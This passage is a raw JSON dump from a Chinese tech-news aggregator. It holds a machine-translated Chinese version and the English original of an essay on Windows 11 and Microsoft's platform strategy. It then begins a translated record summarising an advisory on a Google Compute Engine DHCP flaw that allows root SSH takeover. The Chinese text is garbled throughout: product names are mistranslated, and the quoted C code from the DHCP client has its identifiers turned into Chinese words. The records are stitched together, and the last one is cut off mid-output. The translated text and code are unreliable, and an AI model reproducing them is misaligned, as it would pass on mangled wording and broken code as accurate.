\u7528\u4e8e\u5439\u5618\u53ea\u6355\u83b7\u5c11\u6570Windows\u751f\u6001\u7cfb\u7edf\u7684\u5c11\u6570\u7fa4\u4f53 - \u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u7684\u6e05\u6670\u7684\u7ee7\u4efb\u8005\u662f\u4e9a\u9a6c\u900a\u7f51\u7edc\u670d\u52a1\u548c\u5fae\u8f6f\u81ea\u5df1\u7684Azure\u4e91\u670d\u52a1\u3002\u5728\u6240\u6709\u4e09\u79cd\u60c5\u51b5\u4e0b\uff0c\u90fd\u6709\u5f3a\u5927\u800c\u8010\u7528\u7684\u4f01\u4e1a\uff0c\u53ef\u4ee5\u5728\u9876\u90e8\u5efa\u9020\u3002\n  Nadella\uff1a\u5728\u6211\u4eec\u5728\u5fae\u8f6f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4e00\u76f4\u89c9\u5f97\uff0c\u81f3\u5c11\u4e00\u4e2a\u5e73\u53f0\u7684\u5b9a\u4e49\u662f\uff1a\u5982\u679c\u6bd4\u5e73\u53f0\u5927\u7684\u4e1c\u897f\u4e0d\u80fd\u51fa\u751f\uff0c\u90a3\u4e48\u5b83\u4e0d\u662f\u4e00\u4e2a\u5e73\u53f0\u3002\u7f51\u7edc\uff0c\u5b83\u5728Windows\u4e0a\u957f\u5927\u3002\u60f3\u4e00\u60f3\u3002\u5982\u679c\u6211\u4eec\u8bf4\uff0c\u201c\u6240\u6709\u5546\u4e1a\u53ea\u662f\u901a\u8fc7\u6211\u4eec\u8c03\u89e3\uff0c\u201d\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e9b\u4eba\u8bf4\uff0c\u201c\u6211\u4eec\u5c06\u6709\u81ea\u5df1\u7684\u5546\u4e1a\u6a21\u5f0f\uff0c\u4e9a\u9a6c\u900a\u4e0d\u53ef\u80fd\u5b58\u5728\u3002\u201d\n \u56e0\u6b64\uff0c\u6211\u8ba4\u4e3a\u6bcf\u4e2a\u516c\u53f8\u90fd\u5fc5\u987b\u9009\u62e9\u548c\u770b\u54ea\u4e2a\u805a\u5408\u5c42\uff0c\u54ea\u4e9b\u5e73\u53f0\u5c42\uff0c[\u548c]\u4e3a\u4ed6\u4eec\u7684\u89c4\u5219\u548c\u751f\u6001\u7cfb\u7edf\u5de5\u4f5c\u3002\u4f46\u662f\uff0c\u5728\u6211\u4eec\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5bf9\u6211\u4eec\u786e\u5b9e\u5e0c\u671b\u89e3\u51b3\u540c\u6837\u7684\u5b89\u5168\u95ee\u9898\uff0c[\u548c]\u53d1\u73b0\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u662f\u6211\u4eec\u5f3a\u8c03\u5546\u5e97\u7684\u539f\u56e0\u4e4b\u4e00\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5546\u5e97\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u521b\u5efa\u8005\u5728\u4e0d\u540c\u7684\u7ea7\u522b\u4f7f\u7528\u3002\u6211\u4eec\u5e0c\u671b\u7075\u6d3b\u6027\u6210\u4e3a\u7ade\u4e89\u5dee\u5f02\u5316\u3002\n \u6709\u660e\u786e\u7684\uff0c\u8fd9\u91cc\u6709\u4e00\u5b9a\u6570\u91cf\u7684\u52a8\u529b\u63a8\u7406;\u4e3a\u4e86\u56de\u7b54Microsoft\u5141\u8bb8Google\u5728Windows\u4e0a\u7684\u64ad\u653e\u5546\u5e97\uff08\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff09\u7684\u95ee\u9898\uff0c\u90a3\u4e2a\u4f8b\u5b50\u662fNadella\u5f15\u7528\u7684\u90a3\u6837\u662f\u80af\u5b9a\u5730\u662f\u6e38\u620f\u7684\u591a\u4e2a\u5e02\u573a\u7684\u5b58\u5728\uff0c\u4eceMicrosoft\u5546\u5e97\u5230Xbox\u6e38\u620f\u4f20\u9012\u5230Steam\u53f2\u8bd7\u3002\u4f46\u662f\uff0c\u6211\u53ef\u4ee5\u544a\u8bc9\u4f60\uff0c\u5f53\u6211\u5341\u5e74\u524d\u5728Microsoft Store\u7684\u521d\u59cb\u7248\u672c\u4e0a\u5de5\u4f5c\u65f6\uff0c\u84b8\u6c7d\u5df2\u7ecf\u5efa\u7acb\u4e86\u5f88\u591a\u65f6\uff0c\u84b8\u6c7d\u5df2\u7ecf\u5efa\u9020\u4e86\u5fae\u8f6f\u6240\u611f\u53d7\u5230\u7684\u662f;\u5982\u679c\u516c\u53f8\u9996\u5148\u5b9e\u73b0\u4e86\u5e94\u7528\u5546\u5e97\u7684\u673a\u4f1a\u600e\u4e48\u529e\uff1f\u5982\u679c\u6709\u6570\u5341\u4ebf\u7f8e\u5143\u7684\u80a1\u4efd\uff0c\u90a3\u4f1a\u5982\u6b64\u8ffd\u56de\u7ade\u4e89\u6a21\u578b\uff1f\n \u4e5f\u8bb8\u4e0d\u662f\uff0c\u4f46\u6211\u8ba4\u4e3a\u8fd9\u662f\u4f2a\u88c5\u7684\u795d\u798f\u3002\u96be\u4ee5\u4ece\u91d1\u878d\u4e4b\u5916\u7684\u4efb\u4f55\u89d2\u5ea6\u5bf9Apple\u5bf9Apple\u7684\u5f71\u54cd\u611f\u5230\u96be\u4ee5\u7f6e\u4fe1;\u8fd9\u4e0d\u4ec5\u4ec5\u662f\u4e00\u79cd\u6218\u7565\u7a0e\uff0c\u800c\u4e14\u662f\u4e00\u79cd\u6587\u5316\u7a0e\uff0c\u800c\u4e0d\u4ec5\u6bd2\u5bb3\u4e86\u516c\u53f8\u4e0e\u5f00\u53d1\u4eba\u5458\u7684\u5173\u7cfb\uff0c\u800c\u4e14\u5b9e\u9645\u4e0a\u5bfc\u81f4\u7528\u6237\u7684\u66f4\u7cdf\u7cd5\u7684\u7ecf\u9a8c\uff0c\u800c\u4e14\u5b83\u5e26\u6765\u4e86\u5de8\u5927\u7684\u76d1\u7ba1\u98ce\u9669\u3002 \n\u6211\u6240\u77e5\u9053\u7684\u6240\u6709\u6700\u597d\u7684\u9ed1\u5ba2\u90fd\u9010\u6e10\u8f6c\u5411Macs\u3002\u6211\u7684\u670b\u53cb\u7f57\u4f2f\u7279\u8bf4\uff0c\u4ed6\u7684\u6574\u4e2a\u7814\u7a76\u5c0f\u7ec4\u5728\u9ebb\u7701\u7406\u5de5\u5b66\u9662\u6700\u8fd1\u4e70\u4e86\u5f88\u5927\u7684\u529f\u7387\u7c3f\u3002\u8fd9\u4e9b\u5bb6\u4f19\u4e0d\u662f\u572820\u4e16\u7eaa90\u5e74\u4ee3\u4e2d\u671f\u8d2d\u4e70Apple\u5728\u82f9\u679c\u7684\u4f4e\u70b9\u7684\u5e73\u9762\u8bbe\u8ba1\u5e08\u548c\u7956\u6bcd\u3002\u5f53\u4f60\u53ef\u4ee5\u5f97\u5230\u65f6\uff0c\u4ed6\u4eec\u5c31\u50cf\u662f\u94c1\u6746\u5f0f\u9ed1\u5ba2\u4e00\u6837\u3002\u5f53\u7136\uff0c\u539f\u56e0\u662fOS X. PowerBooks\u7cbe\u7f8e\u8bbe\u8ba1\u5e76\u8fd0\u884cFreeBSD\u3002\u4f60\u8fd8\u9700\u8981\u77e5\u9053\u4ec0\u4e48\uff1f\u2026\n \u5982\u679c\u60a8\u60f3\u5438\u5f15\u9ed1\u5ba2\u6765\u7f16\u5199\u5c06\u9500\u552e\u60a8\u7684\u786c\u4ef6\u7684\u8f6f\u4ef6\uff0c\u60a8\u5fc5\u987b\u4f7f\u5176\u81ea\u884c\u4f7f\u7528\u7684\u4e1c\u897f\u3002\u5b83\u4e0d\u8db3\u4ee5\u8ba9\u5b83\u201c\u5f00\u653e\u201d\u3002\u5b83\u5fc5\u987b\u5f00\u653e\u548c\u826f\u597d\u3002\u6700\u7ec8\uff0c\u5f00\u653e\u548c\u5584\u4e8eMac\uff0c\u6700\u7ec8\u662fMacs\u3002\n \u6240\u4ee5Windows\u662f\u5f00\u653e\u7684\uff0c\u65e0\u8bba\u662f\u60a8\u53ef\u4ee5\u7f16\u5199\u7684\u8f6f\u4ef6\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c\u7684\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u60a8\u53ef\u4ee5\u4f7f\u7528\u7684\u5546\u4e1a\u6a21\u5f0f;\u5fae\u8f6f\u5df2\u7ecf\u5411\u5927\u5bb6\u5f00\u653e\u4e86\u5927\u95e8\u3002\u8fd9\u5bfc\u81f4\u4e86\u4e0b\u4e00\u4e2a\u660e\u663e\u7684\u95ee\u9898\uff1a\u5b83\u5f88\u597d\u5417\uff1f\u5f53\u7136\uff0c\u8fd9\u79cd\u65b9\u6cd5\u4f1a\u5bfc\u81f4\u5f88\u591a\u4e0d\u4e00\u81f4; Patel\u8981\u6c42Nadella\u5728Windows\u4e0a\u5bf9Android\u5e94\u7528\u7a0b\u5e8f\u7684\u6700\u4f73\u53c2\u6570\u662f\u4ec0\u4e48\uff1a\n Nadella\uff1a\u6211\u59cb\u7ec8\u4e89\u8bba\u5c06\u662f\uff0c\u201c\u6211\u4eec\u5fc5\u987b\u62e5\u6709\u4e00\u81f4\u7684\u5e94\u7528\u7a0b\u5e8f\u6a21\u578b\u5417\uff1f\u201d\u56e0\u4e3a\u5982\u679c\u4f60\u60f3\u5230\u521b\u65b0 - \u6211\u4eec\u8fd8\u6709\u4e00\u4e9b\u6211\u4eec\u60f3\u8981\u70b9\u4eae\u7684NUI\u751a\u81f3\u662fAI\u82af\u7247\u5417\uff1f\u5982\u4f55\u4eae\u8d77\u7684API\u53ef\u4ee5\u4ee5\u8fd9\u6837\u7684\u65b9\u5f0f\u4eae\u8d77\uff0c\u5373\u8be5\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5229\u7528\u5b83\uff1f\u5f53\u60a8\u6709\u591a\u4e2a\u5b50\u7cfb\u7edf\u548c\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6a21\u578b\u65f6\uff0c\u60a8\u662f\u5426\u53ef\u4ee5\u5728\u5e73\u53f0\u7cfb\u7edf\u7ea7\u521b\u65b0\u65b9\u9762\u6765\u5b9e\u73b0\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u70b9\u4eae\uff1f\n \u8fd9\u5c06\u662f\u8fd9\u79cd\u4e16\u754c\u7684\u6839\u672c\u6311\u6218\uff0c\u4f46\u6211\u4eec\u89c9\u5f97\u6709\u4e9b\u4eba\u6709\u529e\u6cd5\u3002\u6211\u770b\u8fd9\u4e2a\u7684\u65b9\u5f0f\u4e4b\u4e00\u662f\u60a8\u53ef\u4ee5\u5728\u672a\u6765\u7684Windows\u4e0a\u8f7b\uff0c\u751a\u81f3\u5728\u4eca\u5929\uff0c\u4e3a\u67d0\u4e9b\u65b0\u7684AI API\u8f7b\u677e\u6d4f\u89c8Android\u5e94\u7528\u7a0b\u5e8f\u6216PWA\u5e94\u7528\u7a0b\u5e8f\u6216UWP\u5e94\u7528\u7a0b\u5e8f\u3002\n \u5728Microsoft\u6211\u4eec\u4e3aiOS\u6784\u5efa\uff0c\u6211\u4eec\u4e3aAndroid\u6784\u5efa\uff0c\u6211\u4eec\u4e3aWindows\u6784\u5efa\u3002\u8fd9\u662f[\u6211\u4eec]\u57fa\u672c\u6311\u6218\u4e4b\u4e00\u3002\u6211\u4eec\u6b63\u8bd5\u56fe\u786e\u4fdd\u4f5c\u4e3a\u5f00\u53d1\u4eba\u5458\uff0c\u6211\u4eec\u53ef\u4ee5\u5c3d\u53ef\u80fd\u591a\u5730\u5229\u7528\u5e38\u89c1\u7684\u4ee3\u7801\u5e93\uff0c\u4ee5\u53ca\u4e91\u7684\u5927\u90e8\u5206\uff0c\u4f46\u540c\u65f6\u5728\u6bcf\u4e2a\u5e73\u53f0\u4e0a\u90fd\u662f\u672c\u5730\u6027\u7684\u3002\n Nadella\u7684\u6700\u540e\u4e00\u70b9\u5b9e\u9645\u4e0a\u5bfc\u81f4\u4e86\u683c\u96f7\u5384\u59c6\u6311\u6218\u7684\u53e6\u4e00\u4e2a\u7b54\u6848\uff1a\u5b83\u5f88\u91cd\u8981\u5417\uff1f Apple\u7684\u8f6c\u79fb\u8d8a\u6765\u8d8a\u591a\u5730\u901a\u8fc7\u786c\u4ef6\u533a\u5206MAC\u4e0d\u4ec5\u4ec5\u662fM1\u53ef\u80fd\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5bf9\u4e8eMac\u548cPC\u7684\u73b0\u5b9e\uff0c\u7edd\u5927\u591a\u6570\u57fa\u672c\u8f6f\u4ef6\u662fWeb\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u5728\u7535\u5b50\u6280\u672f\u4e0a\u8fd0\u884c\u7535\u5b50;\u540c\u65f6\uff0c\u5728\u4e00\u4e2a\u5927\u591a\u6570\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u7c7b\u522b - \u9ad8\u6027\u80fd\u6e38\u620f\u4e2d - \u7a97\u6237\u5c31\u50cf\u4ee5\u524d\u4e00\u6837\u5360\u4e3b\u5bfc\u5730\u4f4d\u3002 \n\u4e5f\u8bb8\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8fd9\u4e2a\u6f14\u793a\u6587\u7a3f\u611f\u5230\u5982\u6b64\u4fcf\u76ae\u548c\u5149\u660e\uff1a\u8fd9\u53ef\u80fd\u65e0\u5173\u7d27\u8981\u3002 Windows\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u4e1a\u52a1\uff0c\u4f46Nadella\u5c06\u5176\u91cd\u8981\u6027\u964d\u4f4e\u4e86\u5bf9\u5fae\u8f6f\u5e76\u6ca1\u6709\u907f\u514d\u8fc7\u5ea6\u7684\uff0c\u4f46\u7531\u4e8e\u4e16\u754c\u5728\u516c\u53f8\u6240\u505a\u7684\u4e8b\u60c5\u4e4b\u524d\u5df2\u7ecf\u6539\u53d8\u4e86\u3002 ", "note_en": "When you choose a computer or smartphone to buy these days, you have to pick between several factions. There\u2019s Apple world, which includes the Mac computer, iPhones and iPads, all designed to work together to help you share files, video chat and watch TV as easily as possible. There\u2019s also Google land, whose Android software powers an array of phones, tablets and computers. But with Windows 11, Microsoft wants to break that mold.\n The software giant said Thursday that its next major version of Windows will launch as a free upgrade this fall, offering a host of new features that in some ways appear designed to position Microsoft as the company whose products work with ones from Apple, Google and pretty much anyone else.\n The company\u2019s expanding its support for the Android app for example, allowing people to more easily run phone apps on their computer. Microsoft\u2019s building its Teams software into Windows in a similar way as Apple\u2019s FaceTime is built into Macs \u2014 except Microsoft doesn\u2019t want it to be exclusive. There\u2019s already a Microsoft Teams app for Mac, iPhones and Androids. (Microsoft CEO Satya Nadella even told a reporter he\u2019d be happy to accept FaceTime onto Microsoft computers.)\n I really enjoyed this event; coming in at  a tight 44 minutes and 51 seconds, it had a sort of playfulness and lightness that felt like a big contrast to Apple\u2019s COVID-era commercial-like presentations. It feels like a bit of a role reversal from twenty years ago when Microsoft would have grand over-produced events at CES while Apple put on budget productions at Macworld.\n That\u2019s not a surprise, when you think about it: back then new versions of Windows meant new experiences for basically everyone who used a computer, new opportunities for developers, and new reasons to worry for competitors scared that this might be the year Microsoft made their products a feature. Apple, on the other hand, had nothing to lose.\n Today is the opposite: Apple reigns supreme over the computing landscape. iOS 15 will bring new experiences to a billion users, new APIs provide new opportunities for developers, and Apple isn\u2019t just building in features that hurt competitors, but creating new ones (i.e. Facebook and app install advertising); it is Windows that feels like it has nothing to lose.\n  Of course Windows remains essential software, with a billion-plus userbase of its own, and a critical part of the enterprise landscape in particular (although, as the company highlighted in the presentation, COVID re-established the importance of the PC for consumers as well). What gives Microsoft more freedom-of-movement, though, is that Windows is no longer the core of its business. This remains CEO Satya Nadella\u2019s biggest triumph; I recounted how he shifted the company away from its Windows-centricity in 2018\u2019s  The End of Windows:\n The story of Windows\u2019 decline is relatively straightforward and a classic case of disruption:\n Smartphones first addressed needs the PC couldn\u2019t, then over time started taking over PC functionality directly\n What is more interesting, though, is the story of Windows\u2019 decline in Redmond, culminating with last week\u2019s reorganization that, for the first time since 1980, left the company without a division devoted to personal computer operating systems (Windows was split, with the core engineering group placed under Azure, and the rest of the organization effectively under Office 365; there will still be Windows releases, but it is no longer a standalone business). Such a move didn\u2019t seem possible a mere five years ago, when, in the context of another reorganization, former-CEO Steve Ballmer wrote a memo insisting that Windows was the future\u2026\n Thus my assertion at the top, that the story of how Microsoft came to accept the reality of Windows\u2019 decline is more interesting than the fact of Windows\u2019 decline; this is how CEO Satya Nadella convinced the company to accept the obvious.\n The rest of that article walks through how Nadella led Microsoft to that point, including Office on iPad, several of his strategy memos, and killing Windows Phone; I know it\u2019s a clich\u00e9 to say that something makes for a great business case study, but this really makes for a great business case study!\n What Nadella\u2019s change management also enabled was, to steal the title from  Joanna Stern\u2019s delightful interview with Nadella, a new \u201cStart\u201d for Windows:\n  Yes, the reference was about moving the \u2018Start\u2019 menu to the center, but it applies to the Windows opportunity as well, and that opportunity only exists because what came before was already ended.\n  To return to the Windows/Mac comparison of twenty years ago, Apple\u2019s problem was certainly a lack of developers, but that was, above all, because the company simply didn\u2019t have enough users. The way the company fixed the problem was exactly what you would expect from Apple: they relied on themselves. One of the most brilliant and underrated moves of the Steve Jobs era was the development of the iLife suite of apps \u2014 iMovie, iPhoto, iTunes, iDVD, and GarageBand. I noted last year in  Apple\u2019s Shifting Differentiation:\n OS X brought software to the forefront, delivering not simply a technically sound operating system, but one that was based on Unix, making it particularly attractive to developers. And, on the consumer side, Apple released iLife, a suite of applications that made a Mac useful for normal users. I myself bought my first Mac in this era because I wanted to use GarageBand; 16 years on and my musical ambitions are abandoned, but my Mac usage remains.\n By that point I was buying a Mac despite its hardware: while my iBook was attractive enough, its processor was a Motorola G4 that was not remotely competitive with Intel\u2019s x86 processors; later that year Jobs made the then-shocking-but-in-retrospect-obvious decision to shift Macs to Intel processors. In this case having the same hardware as everyone else in the industry would be a big win for Apple, the better to let their burgeoning software differentiation shine.\n The point of that article, which I wrote upon the release of the M1 Macs, is that Apple\u2019s software differentiation, particularly in the case of the Mac, was the smallest it had been in many years, which is why it was appropriate that the company\u2019s differentiation was shifting back to hardware. Interestingly, though, that means that Microsoft is by definition on the other side of that coin: to the extent that Apple Silicon is superior to x86 (or other ARM chips) is the extent to which Windows is at a disadvantage.\n  Microsoft, like Apple, is responding by doing what they do best, but, because it\u2019s Microsoft, it\u2019s the exact opposite of Apple: instead of more deeply integrating and doing everything themselves in an attempt to appeal to consumers, they are opening up and removing limitations in an attempt to appeal to developers, and by extension consumers who don\u2019t want to be bound into Apple\u2019s ecosystem.\n  Patel: That brings me to some of the big changes in Windows, which are fundamentally about what kind of operating system Windows is going to be and what kind of businesses you can run on it and what kind of business will that be for Microsoft.\n There is a new user interface. The Start button is in the center of the screen. There\u2019s cosmetic differences. But you\u2019re also allowing Android apps to run on Windows. You are integrating the Amazon Android app store. You\u2019ve made some changes to the store economics. You\u2019ve reduced Microsoft\u2019s cut to 15 percent. That\u2019s in comparison to the very controversial 30 percent that Apple charges.\n Then you\u2019re saying to developers, \u201cYou can be in our store and you can not pay us a cut at all if you want to use your own payment model.\u201d How much of that is opportunistic changes \u2014 you\u2019re seeing all the controversy and you sense a market opportunity? And how much of it is this being the correct way to shift your business?\n Nadella: I think it\u2019s driven by competition. What I mean by that is \u2013 what should Microsoft do to manage the platform and the platform rules such that we can thrive in that role?\n The way I\u2019ve interpreted what platforms do is: they have to create opportunity for people who build on the platform. That\u2019s the way to keep a platform relevant. If you\u2019re creating a great opportunity for others to be born on your platform and scale on your platform \u2014 that\u2019s the Microsoft I grew up in. That\u2019s the Windows I grew up with. Whether it is the Adobe folks creating their Creative Cloud or SAP building their ERP [enterprise resource planning] business. Or in today\u2019s world, whether it\u2019s Discord building their community for gamers on Windows or any other business.\n  I sense a real opportunity, because the other two ecosystems that are at scale, for their own internally consistent set of reasons, have conflated \u2014 at least in my mind \u2014 the platform and the aggregation layer with one set of rules. There\u2019s no reason why there should be one set of rules. They can be disaggregated. After all, we do have a store. We do have commerce. You can use it all or you can bring your own. That\u2019s [a] practical thing for Microsoft to do.\n I\u2019m not even trying to make some value statement that Microsoft is virtuous here and others are not. Others have chosen it for whatever reasons they have. This is a design choice and a business model choice. I want to make our own set of design and business model choices so that creators find more choice.\n It\u2019s easy \u2014 and right! \u2014 to note that Microsoft definitely has nothing to lose when it comes to app stores. They don\u2019t make that much money from the Windows App Store, and they (still) need to get more consumer apps for their platform. At the same time, Nadella\u2019s framing of history very much fits with how Microsoft has always thought about Windows; I called it  The Bill Gates Line:\n Over the last few weeks I have been exploring what differences there are between platforms and Aggregators, and was reminded of this anecdote from Chamath Palihapitiya in  an interview with Semil Shah:\n Semil Shah: Do you see any similarities from your time at Facebook with Facebook platform and connect, and how Uber may supercharge their platform?\n Chamath: Neither of them are platforms. They\u2019re both kind of like these comical endeavors that do you as an Nth priority. I was in charge of Facebook Platform. We trumpeted it out like it was some hot shit big deal. And I remember when we raised money from Bill Gates, 3 or 4 months after \u2014 like our funding history was $5M, $83 M, $500M, and then $15B. When that 15B happened a few months after Facebook Platform and Gates said something along the lines of, \u201cThat\u2019s a crock of shit. This isn\u2019t a platform. A platform is when the economic value of everybody that uses it, exceeds the value of the company that creates it. Then it\u2019s a platform.\u201d\n By this measure Windows was indeed the ultimate platform \u2014 the company used to brag about only capturing a minority of the total value of the Windows ecosystem \u2014 and the operating system\u2019s clear successors are Amazon Web Services and Microsoft\u2019s own Azure Cloud Services. In all three cases there are strong and durable businesses to be built on top.\n  Nadella: In our case at Microsoft, I\u2019ve always felt that, at least the definition of a platform is: if something bigger than the platform can\u2019t be born, then it\u2019s not a platform. The web, it grew up on Windows. Think about it. If we said, \u201cAll of commerce is only mediated through us,\u201d Amazon couldn\u2019t exist, if we had somehow said, \u201cWe\u2019re going to have our own commerce model.\u201d\n Therefore I think each company has to choose and see what aggregation layer, what platform layer, [and] what rules work for them and their ecosystem. But, in our case, it\u2019s very clear to us that we do want to solve for the same security issues, [and] discoverability issues, because that\u2019s one of the reasons why we\u2019re emphasizing the store. At the same time, the store can be used at different levels by different creators. We want to have that flexibility be a competitive differentiation.\n There is, to be clear, some amount of motivated reasoning here; in response to a question as to whether Microsoft would allow Google\u2019s Play Store on Windows (the answer is yes), one of the examples Nadella cited positively was the existence of multiple marketplaces for games, from the Microsoft Store to the XBox Game Pass to Steam to Epic. I can tell you, though, that when I worked on the initial version of the Microsoft Store a decade ago there was a lot of consternation that Steam had built what Microsoft felt it should have; what if the company had realized the app store opportunity first? Would it be so laid back about competing models if there were billions of dollars at stake?\n Perhaps not, but I think that is a blessing in disguise. It\u2019s hard to feel great about the impact of the App Store on Apple from any angle other than a financial one; it\u2019s not simply a strategy tax, but a cultural one, not only  poisoning the company\u2019s relationship with developers but actually resulting in  a worse experience for users, and it carries huge  regulatory risk.\n   All the best hackers I know are gradually switching to Macs. My friend Robert said his whole research group at MIT recently bought themselves Powerbooks. These guys are not the graphic designers and grandmas who were buying Macs at Apple\u2019s low point in the mid 1990s. They\u2019re about as hardcore OS hackers as you can get. The reason, of course, is OS X. Powerbooks are beautifully designed and run FreeBSD. What more do you need to know?\u2026\n If you want to attract hackers to write software that will sell your hardware, you have to make it something that they themselves use. It\u2019s not enough to make it \u201copen.\u201d It has to be open and good. And open and good is what Macs are again, finally.\n So Windows is open, both in terms of the software you can write on it, the software you can run, and the business models you can employ; Microsoft has thrown the doors wide open to everyone. That leads to the next obvious question: is it good? Certainly this approach is going to lead to a lot of inconsistency; Patel asked Nadella what was the best argument against Android apps on Windows:\n Nadella: I think always the argument will be, \u201cdo we have to have a consistent app model?\u201d Because if you think about innovation \u2014 is there is some kind of NUI or even an AI chip that we want to light up? How can the APIs of that be lit up in such a way that this application can take advantage of it? When you have multiple subsystems and multiple app models, can you surface your platform system-level innovation such that all apps light up?\n That is going to be the fundamental challenge in such a world, but we feel that there are ways. One of the ways I look at this is you can light an Android app or a PWA app or a UWP app on Windows in the future, or even today, for some of the new AI APIs.\n At Microsoft we build for iOS, we build for Android, we build for Windows. That\u2019s one of [our] fundamental challenges. We\u2019re trying to make sure that as developers, we can leverage as much of the common code base, as much of the cloud, but at the same time, be native on each platform.\n Nadella\u2019s last point actually leads to another answer to Graham\u2019s challenge: does it matter? Apple\u2019s shift to increasingly differentiate the Mac via hardware isn\u2019t simply a function of the M1 being possible, but of the reality that for Macs and PCs the vast majority of essential software are web apps, or run on web technologies like Electron; meanwhile, in the one category where being native matters most \u2014 high performance games \u2014 Windows is as dominant as ever.\n Perhaps that is why this presentation felt so playful and light: it might not matter. Windows is an essential business, but Nadella reduced its importance to Microsoft not out of spite, but because the the world had already changed before the company did.", "posttime": "2021-06-29 22:25:12", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "windows,\u7a97\u6237,lightness", "title": "\u7a97\u6237\u7684\u4eae\u5ea6 ", "title_en": "The Lightness of Windows", "transed": 1, "url": "https://stratechery.com/2021/the-lightness-of-windows/", "via": "", "real_tags": ["windows", "\u7a97\u6237", "lightness"]}, {"category": "", "categoryclass": "", "imagename": "05ba6887303c6ae61423c04e4ac37c61.png", "infoid": 1068417, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e\u672a\u5206\u5272\u6f0f\u6d1e\u7684\u54a8\u8be2\uff08\u5728\u53d1\u5e03\u6b64\u62bc\u91d1\u65f6\uff0c2021-06-25\uff09\u5f71\u54cdGoogle\uff06\uff0339; S Compute Engine\u5e73\u53f0\u7684Virtual Machine\u3002\u4ee5\u4e0b\u6280\u672f\u7ec6\u8282\u51e0\u4e4e\u4e0e\u53d1\u9001\u7ed9VRP\u7684\u62a5\u544a\u5b8c\u5168\u76f8\u540c\u56e2\u961f\u3002\n \u7531\u4e8eISC DHCP\u8f6f\u4ef6\u4f7f\u7528\u7684\u5f31\u52bf\u6570\u4ee5\u53ca\u5176\u4ed6\u56e0\u7d20\u7684\u4e0d\u5e78\u7ec4\u5408\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u63a5\u7ba1\u8c37\u6b4c\u4e91\u5e73\u53f0\u7684\u865a\u62df\u673a\u3002\u8fd9\u662f\u901a\u8fc7\u4ece\u76ee\u6807\u865a\u62df\u673a\uff06\uff0339\u7684\u6a21\u62df\u5143\u6570\u636e\u670d\u52a1\u5668\u5192\u5145\u5143\u6570\u636e\u670d\u52a1\u5668\u6765\u5b8c\u6210\u7684view.by\u5b89\u88c5\u6b64exproit\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7ssh\uff08\u516c\u94a5\u8eab\u4efd\u9a8c\u8bc1\uff09\u6388\u4e88\u81ea\u5df1\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u56e0\u6b64\u5b83\u4eec\u53ef\u4ee5\u4f5c\u4e3aroot\u7528\u6237\u767b\u5f55\u3002\n  ISC\uff06\uff0339; DHCP\u5ba2\u6237\u7aef\uff08Debian Flavors\u4e0a\u7684ISC-DHCP-Client Package\uff09\u7684\u5b9e\u73b0\u4f9d\u8d56\u4e8eonrandom\uff083\uff09\u6765\u751f\u6210\u4f2a\u968f\u673a\u6570\uff08\u65e0\u7ebf\u6dfb\u52a0\u5242\u968f\u673a\u53cd\u9988\uff09\u3002\u65e8\u5728\u4e0eSRANDOM\u529f\u80fd\u4e00\u8d77\u79cd\u5b50\uff1a\n / *\u4ece\u5f53\u524d\u65f6\u95f4\u7ec4\u6210\u968f\u673a\u6570\u53d1\u751f\u5668\u7684\u79cd\u5b50\u52a0\u4e0a\u6bcf\u4e2a\u63a5\u53e3\u7684\u6700\u540e\u56db\u4e2a\u5b57\u8282\u7684\u603b\u548c\uff06\uff0339; s\u786c\u4ef6\u5730\u5740\u88ab\u89e3\u91ca\u4e3a\u6574\u6570\u3002\u6ca1\u6709\u592a\u591a\u7684\u71b5\uff0c\u4f46\u6211\u4eec\uff06\uff0339;\u91cd\u65b0\u542f\u52a8\uff0c\u6240\u4ee5\u6211\u4eec\uff06\uff0339;\u91cd\u590d\u6ca1\u6709\u627e\u5230\u66f4\u597d\u7684\u4e1c\u897f\u3002 * /\u79cd\u5b50= 0; for\uff08IP =\u63a5\u53e3; IP; IP = IP-\uff06gt; next\uff09{int junk; Memcpy\uff08\uff06amp;\u5783\u573e\uff0c\uff06amp; ip-\uff06gt; hw_address.hbuf [Ip-\uff06gt; hw_address.hlen  -  sizeof seed]\uff0csizeof seed\uff09;\u79cd\u5b50+ =\u5783\u573e; srandom\uff08\u79cd\u5b50+ cur_time +\uff08unsigned\uff09getPid\uff08\uff09\uff09;\n  \u7f51\u7edc\u63a5\u53e3\u5361\u7684\u4ee5\u592a\u7f51\u5730\u5740\uff08Mac\uff09\u7684\u6700\u540e4\u4e2a\u5b57\u8282\u7684\u603b\u548c\n \u5728Google Cloud\u5e73\u53f0\u4e0a\uff0c\u865a\u62df\u673a\u901a\u5e38\u53ea\u67091\u4e2aNIC\uff0c\u8fd9\u6837\u7684\u4e1c\u897f\uff1a\n \u6839@ test-instance-1\uff1a\u301c/ isc-dhcp-client / real3\uff03ifconfigens4\uff1aflags = 4163\uff06lt;\u4e0a\u5347\uff0c\u64ad\u653e\uff0c\u8fd0\u884c\uff0c\u591a\u64ad\uff06gt; MTU 1460 INET 10.128.0.2 NetMask 255.255.255.255\u64ad\u653e10.128.0.2 INET6 FE80 :: 4001\uff1aAFF\uff1aFE80\uff1a2 Prefixlen 64 ScopeID 